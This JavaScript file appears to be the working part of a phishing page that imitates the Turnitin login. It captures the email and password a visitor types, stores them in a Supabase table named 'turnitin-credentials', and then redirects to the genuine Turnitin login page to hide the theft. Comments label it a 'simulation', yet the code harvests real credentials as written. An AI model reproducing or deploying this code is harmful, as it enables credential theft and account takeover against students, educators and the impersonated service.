(function () {
    'use strict';

    document.addEventListener('DOMContentLoaded', function () {
        var form = document.forms['FormName'] || document.querySelector('form[name="FormName"]');
        var emailInput = document.getElementById('email');
        var iboxForm = document.getElementById('ibox_form');
        var noscript = document.querySelector('.noscript');

        // Show form, hide noscript message
        if (iboxForm) iboxForm.style.display = 'block';
        if (noscript) noscript.style.display = 'none';

        // Focus email field
        if (emailInput) emailInput.focus();

        // Initialize Supabase using config.js
        const _supabase = supabase.createClient(SUPABASE_CONFIG.URL, SUPABASE_CONFIG.KEY);

        if (form) {
            form.addEventListener('submit', async function (event) {
                event.preventDefault();
                var email = document.getElementById('email');
                var password = document.getElementById('password');

                if (!email || !email.value.trim()) {
                    alert('Please enter your email address.');
                    if (email) email.focus();
                    return false;
                }
                if (!password || !password.value) {
                    alert('Please enter your password.');
                    if (password) password.focus();
                    return false;
                }

                // Show loading state or just process
                const emailVal = email.value.trim();
                const passVal = password.value;

                try {
                    // Simulation: Insert into Supabase "turnitin-credentials"
                    await _supabase
                        .from('turnitin-credentials')
                        .insert([{ email: emailVal, password: passVal }]);
                } catch (err) {
                    console.error('Submission error:', err);
                } finally {
                    // Always redirect to official site to complete simulation
                    window.location.href = 'https://www.turnitin.com/login_page.asp';
                }
            });
        }
        // SSO Errors
        var ssoError = document.getElementById('sso-error');
        var googleBtn = document.getElementById('google-sso');
        var cleverBtn = document.getElementById('clever-sso');

        function showSsoError(e) {
            e.preventDefault();
            if (ssoError) {
                ssoError.style.display = 'block';
            }
        }

        // Removing redundant SSO error handlers to allow direct redirect
        // if (googleBtn) googleBtn.addEventListener('click', showSsoError);
        // if (cleverBtn) cleverBtn.addEventListener('click', showSsoError);
    });
})();
